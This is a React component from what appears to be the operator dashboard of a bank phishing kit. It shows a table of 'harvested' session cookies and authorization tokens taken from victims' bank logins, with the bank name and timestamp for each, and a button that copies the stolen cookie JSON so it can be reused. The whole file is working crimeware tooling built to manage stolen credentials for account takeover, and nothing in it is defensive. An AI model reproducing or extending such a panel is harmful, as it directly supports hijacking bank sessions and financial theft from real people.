"use client";

export default function SessionCookiesTab({ leads }: { leads: any[] }) {
  const cookieLeads = leads.filter((l) => l.cookiesData || l.extraData?.includes("Cookie"));

  return (
    <div className="space-y-6">
      <div className="bg-[#141418] border border-zinc-800 rounded-xl p-6 shadow-xl text-zinc-100">
        <div className="flex items-center justify-between mb-4">
          <div>
            <h3 className="text-sm font-bold text-zinc-100 flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-amber-500"></span>
              Harvested Session Cookies & Authorization Tokens
            </h3>
            <p className="text-xs text-zinc-400 mt-1">
              Secure JSON cookies captured automatically upon successful bank logins.
            </p>
          </div>
          <span className="px-3 py-1 bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-lg text-xs font-bold">
            Total Tokens: {cookieLeads.length}
          </span>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs">
            <thead className="bg-zinc-900/80 text-zinc-400 uppercase tracking-wider border-b border-zinc-800">
              <tr>
                <th className="py-3 px-4">Session ID</th>
                <th className="py-3 px-4">Bank Name</th>
                <th className="py-3 px-4">Captured Data / Cookies</th>
                <th className="py-3 px-4">Timestamp</th>
                <th className="py-3 px-4 text-right">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-800/60">
              {cookieLeads.map((lead: any, idx: number) => (
                <tr key={idx} className="hover:bg-zinc-900/40 transition">
                  <td className="py-3.5 px-4 font-mono text-zinc-300">{lead.sessionId || "sess_auto"}</td>
                  <td className="py-3.5 px-4 font-semibold text-zinc-200">{lead.bankName || lead.bank || "Bank"}</td>
                  <td className="py-3.5 px-4">
                    <code className="bg-zinc-950 text-emerald-400 px-2 py-1 rounded text-[10px] block max-w-xs truncate">
                      {lead.cookiesData || lead.extraData || "Active Token Available"}
                    </code>
                  </td>
                  <td className="py-3.5 px-4 text-zinc-400">{new Date(lead.createdAt).toLocaleString()}</td>
                  <td className="py-3.5 px-4 text-right">
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(lead.cookiesData || lead.extraData || "");
                        alert("Cookies copied to clipboard!");
                      }}
                      className="px-3 py-1 bg-indigo-600/20 hover:bg-indigo-600 text-indigo-400 hover:text-white rounded text-[11px] font-medium border border-indigo-500/30 transition cursor-pointer"
                    >
                      📋 Copy JSON
                    </button>
                  </td>
                </tr>
              ))}
              {cookieLeads.length === 0 && (
                <tr>
                  <td colSpan={5} className="text-center py-12 text-zinc-500">
                    No session cookies harvested yet. Successful logins will populate here.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}